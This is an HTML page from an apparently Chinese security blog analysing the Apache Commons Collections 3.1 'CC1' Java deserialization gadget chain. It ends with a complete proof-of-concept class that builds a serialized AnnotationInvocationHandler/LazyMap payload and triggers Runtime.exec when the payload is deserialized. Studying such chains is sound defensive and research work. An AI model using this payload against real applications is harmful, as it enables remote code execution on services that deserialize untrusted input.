@@ -1,0 +1,658 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+    
+    <title>Java CommonsCollections1 反序列化分析 | T1melo0per&#39;blog</title>
+
+    <meta name="description" content="&lt;h1 id=&#34;环境搭建&#34;&gt;&lt;a href=&#34;#环境搭建&#34; class=&#34;headerlink&#34; title=&#34;环境搭建&#34;&gt;&lt;/a&gt;环境搭建&lt;/h1&gt;&lt;p&gt;创建Maven项目后，导入如下依赖&lt;/p&gt;
+&lt;p&gt;注：本文复现环境 jdk1.7&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;txt&#34;&gt;    &amp;lt;dependencies&amp;gt;
+        &amp;lt;dependency&amp;gt;
+            &amp;lt;groupId&amp;gt;commons-collections&amp;lt;/groupId&amp;gt;
+            &amp;lt;artifactId&amp;gt;commons-collections&amp;lt;/artifactId&amp;gt;
+            &amp;lt;version&amp;gt;3.1&amp;lt;/version&amp;gt;
+        &amp;lt;/dependency&amp;gt;
+    &amp;lt;/dependencies&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;">
+    <meta name="keywords" content="">
+
+    
+
+    <meta property="og:locale" content="en" />
+    <meta property="og:type" content="article" />
+    <meta property="og:title" content= "Java CommonsCollections1 反序列化分析 | T1melo0per&#39;blog"  />
+    <meta property="og:description" content= "&lt;h1 id=&#34;环境搭建&#34;&gt;&lt;a href=&#34;#环境搭建&#34; class=&#34;headerlink&#34; title=&#34;环境搭建&#34;&gt;&lt;/a&gt;环境搭建&lt;/h1&gt;&lt;p&gt;创建Maven项目后，导入如下依赖&lt;/p&gt;
+&lt;p&gt;注：本文复现环境 jdk1.7&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;txt&#34;&gt;    &amp;lt;dependencies&amp;gt;
+        &amp;lt;dependency&amp;gt;
+            &amp;lt;groupId&amp;gt;commons-collections&amp;lt;/groupId&amp;gt;
+            &amp;lt;artifactId&amp;gt;commons-collections&amp;lt;/artifactId&amp;gt;
+            &amp;lt;version&amp;gt;3.1&amp;lt;/version&amp;gt;
+        &amp;lt;/dependency&amp;gt;
+    &amp;lt;/dependencies&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;" />
+    <meta property="og:url" content="https://t1melo0per.github.io/2022/05/05/cc1/index.html" />
+    <meta property="og:site_name" content="" />
+    <meta property="article:author" content="John Doe" />
+    <meta property="article:publisher" content="" />
+    <meta property="og:description" content="&lt;h1 id=&#34;环境搭建&#34;&gt;&lt;a href=&#34;#环境搭建&#34; class=&#34;headerlink&#34; title=&#34;环境搭建&#34;&gt;&lt;/a&gt;环境搭建&lt;/h1&gt;&lt;p&gt;创建Maven项目后，导入如下依赖&lt;/p&gt;
+&lt;p&gt;注：本文复现环境 jdk1.7&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;txt&#34;&gt;    &amp;lt;dependencies&amp;gt;
+        &amp;lt;dependency&amp;gt;
+            &amp;lt;groupId&amp;gt;commons-collections&amp;lt;/groupId&amp;gt;
+            &amp;lt;artifactId&amp;gt;commons-collections&amp;lt;/artifactId&amp;gt;
+            &amp;lt;version&amp;gt;3.1&amp;lt;/version&amp;gt;
+        &amp;lt;/dependency&amp;gt;
+    &amp;lt;/dependencies&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;" />
+    <meta name="twitter:title" content="Java CommonsCollections1 反序列化分析 | T1melo0per&#39;blog"/>
+    <meta name="twitter:description" content="&lt;h1 id=&#34;环境搭建&#34;&gt;&lt;a href=&#34;#环境搭建&#34; class=&#34;headerlink&#34; title=&#34;环境搭建&#34;&gt;&lt;/a&gt;环境搭建&lt;/h1&gt;&lt;p&gt;创建Maven项目后，导入如下依赖&lt;/p&gt;
+&lt;p&gt;注：本文复现环境 jdk1.7&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;txt&#34;&gt;    &amp;lt;dependencies&amp;gt;
+        &amp;lt;dependency&amp;gt;
+            &amp;lt;groupId&amp;gt;commons-collections&amp;lt;/groupId&amp;gt;
+            &amp;lt;artifactId&amp;gt;commons-collections&amp;lt;/artifactId&amp;gt;
+            &amp;lt;version&amp;gt;3.1&amp;lt;/version&amp;gt;
+        &amp;lt;/dependency&amp;gt;
+    &amp;lt;/dependencies&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;"/>
+    <script type="application/ld+json">
+        {
+            "description": "&lt;h1 id=&#34;环境搭建&#34;&gt;&lt;a href=&#34;#环境搭建&#34; class=&#34;headerlink&#34; title=&#34;环境搭建&#34;&gt;&lt;/a&gt;环境搭建&lt;/h1&gt;&lt;p&gt;创建Maven项目后，导入如下依赖&lt;/p&gt;
+&lt;p&gt;注：本文复现环境 jdk1.7&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;txt&#34;&gt;    &amp;lt;dependencies&amp;gt;
+        &amp;lt;dependency&amp;gt;
+            &amp;lt;groupId&amp;gt;commons-collections&amp;lt;/groupId&amp;gt;
+            &amp;lt;artifactId&amp;gt;commons-collections&amp;lt;/artifactId&amp;gt;
+            &amp;lt;version&amp;gt;3.1&amp;lt;/version&amp;gt;
+        &amp;lt;/dependency&amp;gt;
+    &amp;lt;/dependencies&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;",
+            "author": { "@type": "Person", "name": "John Doe" },
+            "@type": "BlogPosting",
+            "url": "https://t1melo0per.github.io/2022/05/05/cc1/index.html",
+            "publisher": {
+            "@type": "Organization",
+            "logo": {
+                "@type": "ImageObject",
+                "url": "https://T1melo0per.github.ioundefined"
+            },
+            "name": "John Doe"
+            },
+            "headline": "Java CommonsCollections1 反序列化分析 | T1melo0per&#39;blog",
+            "datePublished": "2022-05-05T01:52:38.000Z",
+            "mainEntityOfPage": {
+                "@type": "WebPage",
+                "@id": "https://t1melo0per.github.io/2022/05/05/cc1/index.html"
+            },
+            "@context": "http://schema.org"
+        }
+    </script>
+
+
+
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+<link rel="stylesheet" href="/dist/build.css?v=1646451311888.css">
+
+
+    
+<link rel="stylesheet" href="/dist/custom.css?v=1646451311888.css">
+
+
+    <script>
+        window.isPost = true
+        window.aomori = {
+            
+            
+            
+        }
+        window.aomori_logo_typed_animated = false
+        window.aomori_search_algolia = false
+
+    </script>
+
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+<body>
+
+    <div class="container">
+    <header class="header">
+        <div class="header-type">
+            
+            <div class="header-type-inner">
+                
+                    <a class="header-type-title" href="/">T1melo0per&#39;blog</a>
+                
+    
+                
+            </div>
+        </div>
+        <div class="header-menu">
+            <div class="header-menu-inner">
+                
+                <a href="/">首页</a>
+                
+                <a href="/archives">存档</a>
+                
+                <a href="/tools">工具箱</a>
+                
+                <a href="/about">关于</a>
+                
+            </div>
+            <div class="header-menu-social">
+                
+            </div>
+        </div>
+
+        <div class="header-menu-mobile">
+            <div class="header-menu-mobile-inner" id="mobile-menu-open">
+                <i class="icon icon-menu"></i>
+            </div>
+        </div>
+    </header>
+
+    <div class="header-menu-mobile-menu">
+        <div class="header-menu-mobile-menu-bg"></div>
+        <div class="header-menu-mobile-menu-wrap">
+            <div class="header-menu-mobile-menu-inner">
+                <div class="header-menu-mobile-menu-close" id="mobile-menu-close">
+                    <i class="icon icon-cross"></i>
+                </div>
+                <div class="header-menu-mobile-menu-list">
+                    
+                    <a href="/">首页</a>
+                    
+                    <a href="/archives">存档</a>
+                    
+                    <a href="/tools">工具箱</a>
+                    
+                    <a href="/about">关于</a>
+                    
+                </div>
+            </div>
+        </div>
+    </div>
+
+</div>
+
+    <div class="container">
+        <div class="main">
+            <section class="inner">
+                <section class="inner-main">
+                    <div class="post">
+    <article id="post-cl2scuzwk0000z8qudpu68vn8" class="article article-type-post" itemscope
+    itemprop="blogPost">
+
+    <div class="article-inner">
+
+        
+          
+        
+        
+        
+
+        
+        <header class="article-header">
+            
+  
+    <h1 class="article-title" itemprop="name">
+      Java CommonsCollections1 反序列化分析
+    </h1>
+  
+
+        </header>
+        
+
+        <div class="article-more-info article-more-info-post hairline">
+
+            <div class="article-date">
+  <time datetime="2022-05-05T01:52:38.000Z" itemprop="datePublished">2022-05-05</time>
+</div>
+
+            
+            <div class="article-category">
+                <a class="article-category-link" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a>
+            </div>
+            
+
+            
+            <div class="article-tag">
+                <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CommonsCollections/" rel="tag">CommonsCollections</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">反序列化</a></li></ul>
+            </div>
+            
+
+            
+
+        </div>
+
+        <div class="article-entry post-inner-html hairline" itemprop="articleBody">
+            <h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>创建Maven项目后，导入如下依赖</p>
+<p>注：本文复现环境 jdk1.7</p>
+<pre><code class="txt">    &lt;dependencies&gt;
+        &lt;dependency&gt;
+            &lt;groupId&gt;commons-collections&lt;/groupId&gt;
+            &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;
+            &lt;version&gt;3.1&lt;/version&gt;
+        &lt;/dependency&gt;
+    &lt;/dependencies&gt;
+</code></pre>
+<span id="more"></span>
+
+<h1 id="CC1链分析"><a href="#CC1链分析" class="headerlink" title="CC1链分析"></a>CC1链分析</h1><h2 id="分析触发点"><a href="#分析触发点" class="headerlink" title="分析触发点"></a>分析触发点</h2><p>其实CC1链主要还是利用Transformer通过内部反射构造出Runtime.getRuntime().exec(“cmd”)来执行命令</p>
+<p>代码如下：</p>
+<pre><code class="java">        ChainedTransformer chain = new ChainedTransformer(new Transformer[] &#123;
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123;
+                        String.class, Class[].class &#125;, new Object[] &#123;
+                        &quot;getRuntime&quot;, new Class[0] &#125;),
+                new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;
+                        Object.class, Object[].class &#125;, new Object[] &#123;
+                        null, new Object[0] &#125;),
+                new InvokerTransformer(&quot;exec&quot;,
+                        new Class[] &#123; String.class &#125;, new Object[]&#123;&quot;calc&quot;&#125;)&#125;);
+        chain.transform(Object.class);
+</code></pre>
+<p><img src="https://t0safeimage.oss-cn-beijing.aliyuncs.com/imgimgimage-20220502190126-68rhy6f.png" alt="image.png"></p>
+<h3 id="Transformer"><a href="#Transformer" class="headerlink" title="Transformer"></a>Transformer</h3><p>Transformer接口存在transform方法</p>
+<pre><code class="JAVA">//
+// Source code recreated from a .class file by IntelliJ IDEA
+// (powered by FernFlower decompiler)
+//
+
+package org.apache.commons.collections;
+
+public interface Transformer &#123;
+    Object transform(Object var1);
+&#125;
+</code></pre>
+<p>其中Transformer接口有如下实现类</p>
+<h4 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h4><p>构造方法：</p>
+<pre><code class="JAVA">    public ChainedTransformer(Transformer[] transformers) &#123;
+        this.iTransformers = transformers;
+    &#125;
+</code></pre>
+<p>transform实现：</p>
+<pre><code class="JAVA">    public Object transform(Object object) &#123;
+        for(int i = 0; i &lt; this.iTransformers.length; ++i) &#123;
+            object = this.iTransformers[i].transform(object);
+        &#125;
+
+        return object;
+    &#125;
+</code></pre>
+<h4 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h4><p>构造方法：</p>
+<pre><code class="JAVA">    public ConstantTransformer(Object constantToReturn) &#123;
+        this.iConstant = constantToReturn;
+    &#125;
+</code></pre>
+<p>transform实现：</p>
+<pre><code class="JAVA">    public Object transform(Object input) &#123;
+        return this.iConstant;
+    &#125;
+</code></pre>
+<h4 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h4><p>构造方法：</p>
+<pre><code class="JAVA">    private InvokerTransformer(String methodName) &#123;
+        this.iMethodName = methodName;
+        this.iParamTypes = null;
+        this.iArgs = null;
+    &#125;
+
+    public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) &#123;
+        this.iMethodName = methodName;
+        this.iParamTypes = paramTypes;
+        this.iArgs = args;
+    &#125;
+</code></pre>
+<p>transform实现：</p>
+<pre><code class="JAVA">    public Object transform(Object input) &#123;
+        if (input == null) &#123;
+            return null;
+        &#125; else &#123;
+            try &#123;
+                Class cls = input.getClass();
+                Method method = cls.getMethod(this.iMethodName, this.iParamTypes);
+                return method.invoke(input, this.iArgs);
+            &#125; catch (NoSuchMethodException var5) &#123;
+                throw new FunctorException(&quot;InvokerTransformer: The method &#39;&quot; + this.iMethodName + &quot;&#39; on &#39;&quot; + input.getClass() + &quot;&#39; does not exist&quot;);
+            &#125; catch (IllegalAccessException var6) &#123;
+                throw new FunctorException(&quot;InvokerTransformer: The method &#39;&quot; + this.iMethodName + &quot;&#39; on &#39;&quot; + input.getClass() + &quot;&#39; cannot be accessed&quot;);
+            &#125; catch (InvocationTargetException var7) &#123;
+                throw new FunctorException(&quot;InvokerTransformer: The method &#39;&quot; + this.iMethodName + &quot;&#39; on &#39;&quot; + input.getClass() + &quot;&#39; threw an exception&quot;, var7);
+            &#125;
+        &#125;
+    &#125;
+</code></pre>
+<p>了解过反射相关的知识的话不难看出，可以多次利用ConstantTransformer和InvokerTransformer构造出Rumtime….exec()反射链，但此时构造的反射链只是一个个独立的Transformer实例，需要由ChainedTransformer实现的transform方法将前面构造的多个实例组成的数组连起来实现命令执行</p>
+<p>代码如下</p>
+<pre><code class="JAVA">        ChainedTransformer chain = new ChainedTransformer(new Transformer[] &#123;
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123;
+                        String.class, Class[].class &#125;, new Object[] &#123;
+                        &quot;getRuntime&quot;, new Class[0] &#125;),
+                new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;
+                        Object.class, Object[].class &#125;, new Object[] &#123;
+                        null, new Object[0] &#125;),
+                new InvokerTransformer(&quot;exec&quot;,
+                        new Class[] &#123; String.class &#125;, new Object[]&#123;&quot;calc&quot;&#125;)&#125;);
+        chain.transform(Object.class);
+</code></pre>
+<p>单利用Transformer链命令执行需要调用transform方法才能触发，实现更简单触发实现命令执行需要找到更完美的调用链。</p>
+<h2 id="构建利用链"><a href="#构建利用链" class="headerlink" title="构建利用链"></a>构建利用链</h2><p>前面已经分析出命令执行需要调用transform方法才能触发，利用最朴实无华的方法找到LazyMap重写父类Map的get方法会调用transform</p>
+<p><img src="https://t0safeimage.oss-cn-beijing.aliyuncs.com/imgimgimage-20220503014131-riga7s0.png" alt="image.png"></p>
+<p>利用LazyMap调用Transformer链实现命令执行相关实现代码</p>
+<pre><code class="JAVA">        Class clazz = Class.forName(&quot;org.apache.commons.collections.map.LazyMap&quot;);
+        Constructor[] constructors = clazz.getDeclaredConstructors();
+        Constructor constructor = constructors[0];
+        constructor.setAccessible(true);
+        Map map = (Map)constructor.newInstance(innermap,chain);
+        map.get(&quot;&quot;);
+</code></pre>
+<p><img src="https://t0safeimage.oss-cn-beijing.aliyuncs.com/imgimgimage-20220503014714-scqrybm.png" alt="image.png"></p>
+<p>但这里仍存在同样问题，LazyMap的get方法也需要被调用才可以触发命令执行</p>
+<p>从Ysoserial的cc1相关代码发现 其中代理类<code>AnnotationInvocationHandler</code>的invoke方法可对传入的LazyMap对象调用其get方法</p>
+<p><img src="https://t0safeimage.oss-cn-beijing.aliyuncs.com/imgimgimage-20220503015225-r2q9hjs.png" alt="image.png"></p>
+<p>一环套一环，触发AnnotationInvocationHandler的invoke方法需要对其实现的变量进行操作，所以可以先用<code>java.lang.reflect.Proxy</code>封装一个LazyMap</p>
+<p>代码如下</p>
+<pre><code class="JAVA">        HashMap innermap = new HashMap();
+      
+        Class clazz = Class.forName(&quot;org.apache.commons.collections.map.LazyMap&quot;);
+        Constructor[] constructors = clazz.getDeclaredConstructors();
+        Constructor constructor = constructors[0];
+        constructor.setAccessible(true);
+        Map map = (Map)constructor.newInstance(innermap,chain);
+
+
+        Constructor handler_constructor = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;).getDeclaredConstructor(Class.class,Map.class);
+        handler_constructor.setAccessible(true);
+        InvocationHandler map_handler = (InvocationHandler) handler_constructor.newInstance(Override.class,map); //创建第一个代理的handler
+
+        Map proxy_map = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),new Class[]&#123;Map.class&#125;,map_handler); //创建proxy对象
+</code></pre>
+<p>当调用proxy_map方法时会触发AnnotationInvocationHandler的invoke方法并命令执行</p>
+<p><img src="https://t0safeimage.oss-cn-beijing.aliyuncs.com/imgimgimage-20220503020346-vuojajf.png" alt="image.png"></p>
+<p><img src="https://t0safeimage.oss-cn-beijing.aliyuncs.com/imgimgimage-20220503020402-y1wgkgg.png" alt="image.png"></p>
+<p><img src="https://t0safeimage.oss-cn-beijing.aliyuncs.com/imgimgimage-20220503020507-d07rnty.png" alt="image.png"></p>
+<p>继续分析</p>
+<p>AnnotationInvocationHandler不仅实现了代理接口，同样实现了序列化接口并重写了readObject</p>
+<p>图下代码中可看出，在进行反序列化时会对传入的Map执行entrySet方法(此时的Map即前面用Proxy包装的LazyMap)</p>
+<p><img src="https://t0safeimage.oss-cn-beijing.aliyuncs.com/imgimgimage-20220503020649-etgb50s.png" alt="image.png"></p>
+<p>成功命令执行</p>
+<p><img src="https://t0safeimage.oss-cn-beijing.aliyuncs.com/imgimgimage-20220503021012-dxlvk9h.png" alt="image.png"></p>
+<p>完整代码</p>
+<pre><code class="JAVA">import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.*;
+import java.io.*;
+import java.lang.reflect.*;
+import java.util.HashMap;
+import java.util.Map;
+
+public class Main &#123;
+
+    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException, NoSuchFieldException, IOException &#123;
+        ChainedTransformer chain = new ChainedTransformer(new Transformer[] &#123;
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123;
+                        String.class, Class[].class &#125;, new Object[] &#123;
+                        &quot;getRuntime&quot;, new Class[0] &#125;),
+                new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;
+                        Object.class, Object[].class &#125;, new Object[] &#123;
+                        null, new Object[0] &#125;),
+                new InvokerTransformer(&quot;exec&quot;,
+                        new Class[] &#123; String.class &#125;, new Object[]&#123;&quot;calc&quot;&#125;)&#125;);
+
+
+        HashMap innermap = new HashMap();
+
+        Class clazz = Class.forName(&quot;org.apache.commons.collections.map.LazyMap&quot;);
+        Constructor[] constructors = clazz.getDeclaredConstructors();
+        Constructor constructor = constructors[0];
+        constructor.setAccessible(true);
+        Map map = (Map)constructor.newInstance(innermap,chain);
+
+
+        Constructor handler_constructor = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;).getDeclaredConstructor(Class.class,Map.class);
+        handler_constructor.setAccessible(true);
+        InvocationHandler map_handler = (InvocationHandler) handler_constructor.newInstance(Override.class,map); 
+
+        Map proxy_map = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),new Class[]&#123;Map.class&#125;,map_handler);
+
+        proxy_map.entrySet();
+
+        Constructor AnnotationInvocationHandler_Constructor = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;).getDeclaredConstructor(Class.class,Map.class);
+
+        AnnotationInvocationHandler_Constructor.setAccessible(true);
+        InvocationHandler handler = (InvocationHandler)AnnotationInvocationHandler_Constructor.newInstance(Override.class,proxy_map);
+
+        try&#123;
+            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(&quot;./cc1&quot;));
+            outputStream.writeObject(handler);
+            outputStream.close();
+
+            ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(&quot;./cc1&quot;));
+            inputStream.readObject();
+        &#125;catch(Exception e)&#123;
+            e.printStackTrace();
+        &#125;
+    &#125;
+&#125;
+</code></pre>
+
+        </div>
+
+    </div>
+
+    
+
+    
+
+    
+  <div class="article-refer hairline">
+    <h3>文章参考文献</h3>
+    
+    <p>
+      <a target="_blank" rel="nofollow" href="">Java安全漫谈</a>
+    </p>
+    
+  </div>
+  
+
+    
+
+    
+
+    
+<nav class="article-nav">
+  
+  
+    <a href="/2022/04/29/tips-wechat/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-caption">precedente</div>
+      <div class="article-nav-title">小技巧之利用微信公众号、小程序信息收集</div>
+    </a>
+  
+</nav>
+
+
+    <!--
+    <section class="share">
+        <div class="share-title">share</div>
+        <a class="share-item" target="_blank"
+            href="https://twitter.com/share?text=Java CommonsCollections1 反序列化分析 - T1melo0per'blog&url=https://t1melo0per.github.io/2022/05/05/cc1/">
+            <box-icon type='logo' name='twitter'></box-icon>
+        </a>
+        <a class="share-item" target="_blank"
+            href="https://www.facebook.com/sharer.php?title=Java CommonsCollections1 反序列化分析 - T1melo0per'blog&u=https://t1melo0per.github.io/2022/05/05/cc1/">
+            <box-icon name='facebook-square' type='logo' ></box-icon>
+        </a>
+        <!-- <a class="share-item" target="_blank"
+            href="https://service.weibo.com/share/share.php?title=Java CommonsCollections1 反序列化分析 - T1melo0per'blog&url=https://t1melo0per.github.io/2022/05/05/cc1/&pic=">
+            <div class="n-icon n-icon-weibo"></div>
+        </a> -->
+    </section>
+
+-->
+
+</article>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</div>
+                </section>
+            </section>
+
+            
+            <aside class="sidebar ">
+                
+
+
+<div class="widget" id="widget">
+    
+      
+  <div class="widget-wrap">
+    <div class="widget-inner">
+      <div class="toc post-toc-html"></div>
+    </div>
+  </div>
+
+    
+      
+  <div class="widget-wrap widget-cate">
+    <div class="widget-title"><span>Categories</span></div>
+    <div class="widget-inner">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget-wrap widget-tags">
+    <div class="widget-title"><span>Tags</span></div>
+    <div class="widget-inner">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CommonsCollections/" rel="tag">CommonsCollections</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/shiro/" rel="tag">shiro</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" rel="tag">信息收集</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%86%85%E5%AD%98%E9%A9%AC/" rel="tag">内存马</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8F%8D%E5%B0%84/" rel="tag">反射</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">反序列化</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%9F%BA%E7%A1%80/" rel="tag">基础</a></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget-wrap widget-recent-posts">
+    <div class="widget-title"><span>Recent Posts</span></div>
+    <div class="widget-inner">
+      <ul>
+        
+          <li>
+            <a href="/2022/05/05/cc1/">Java CommonsCollections1 反序列化分析</a>
+          </li>
+        
+          <li>
+            <a href="/2022/04/29/tips-wechat/">小技巧之利用微信公众号、小程序信息收集</a>
+          </li>
+        
+          <li>
+            <a href="/2022/04/27/memshell-filter/">Tomcat Filter内存马实现</a>
+          </li>
+        
+          <li>
+            <a href="/2022/04/27/basereflect/">Java基础 反射</a>
+          </li>
+        
+          <li>
+            <a href="/2022/04/26/CVE-2016-4437/">CVE-2016-4437 Shiro反序列化分析</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+    
+      
+  <div class="widget-wrap widget-archive">
+    <div class="widget-title"><span>Archive</span></div>
+    <div class="widget-inner">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/">2022</a></li></ul>
+    </div>
+  </div>
+
+
+    
+</div>
+
+<div id="backtop"><i class="icon icon-arrow-up"></i></div>
+            </aside>
+            
+        </div>
+    </div>
+
+    <footer class="footer">
+    <div class="footer-wave">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1440 320"><path fill="#3c4859" fill-opacity="1" d="M0,160L60,181.3C120,203,240,245,360,240C480,235,600,181,720,186.7C840,192,960,256,1080,261.3C1200,267,1320,213,1380,186.7L1440,160L1440,320L1380,320C1320,320,1200,320,1080,320C960,320,840,320,720,320C600,320,480,320,360,320C240,320,120,320,60,320L0,320Z"></path></svg>
+    </div>
+
+    <!-- Please do not remove this -->
+    <!-- 开源不易，请勿删除 -->
+    <div class="footer-wrap">
+        <div class="footer-inner"> 
+            Mail: <a href="mailto:t1melo0per@qq.com">t1melo0per@qq.com</a><br>
+            T1melo0per&#39;blog &copy; 2022 &Theme By <a href="https://linhong.me/" target="_blank">Aomori</a> · <a href="https://github.com/lh1me/hexo-theme-aomori" target="_blank">Github</a>
+        </div>
+    </div>
+
+</footer>
+
+
+
+
+
+
+<script src="/dist/build.js?1646451311888.js"></script>
+
+
+<script src="/dist/custom.js?1646451311888.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+</body>
+
+</html>
